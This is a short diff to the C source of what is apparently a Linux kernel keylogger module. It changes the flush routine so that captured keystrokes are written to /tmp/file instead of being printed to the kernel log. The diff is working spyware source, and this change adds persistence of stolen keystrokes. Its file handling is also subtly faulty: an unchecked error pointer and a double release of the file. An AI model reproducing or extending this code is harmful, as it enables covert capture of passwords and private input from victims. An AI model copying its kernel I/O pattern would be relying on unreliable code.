@@ -197,6 +197,10 @@ static void		ks_list_flush(void)
 	struct list_head 	*pos;
 	struct keystroke	*ks = NULL;
 	struct keystroke 	*n = NULL;
+	struct file		*file;
+	mm_segment_t		old_fs;
+	loff_t			off = 0;
+	int			fd;
 	ssize_t			size = 0;	
 	char			*buf = NULL;
 	char			*tokens;
@@ -219,16 +223,22 @@ static void		ks_list_flush(void)
 	}
 
 	tmp = buf;
-	tokens = "\r";
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	if ((file = filp_open("/tmp/file", O_WRONLY | O_CREAT | O_TRUNC, 0644))) {
+		kernel_write(file, buf, strlen(buf), &off);
+		fput(file);
+	}
+	filp_close(file, 0);
+	set_fs(old_fs);
+/*	tokens = "\r";
 	while ((str = strsep(&buf, tokens)))
 		printk(KERN_INFO "%s\n", str);
-
-	printk(KERN_INFO "nbr of entries was %lu\n", size);
-
+*/
 	kfree(tmp);
 err:
 	return;
-
 }
 
 static void __exit 	keylogger_cleanup(void)
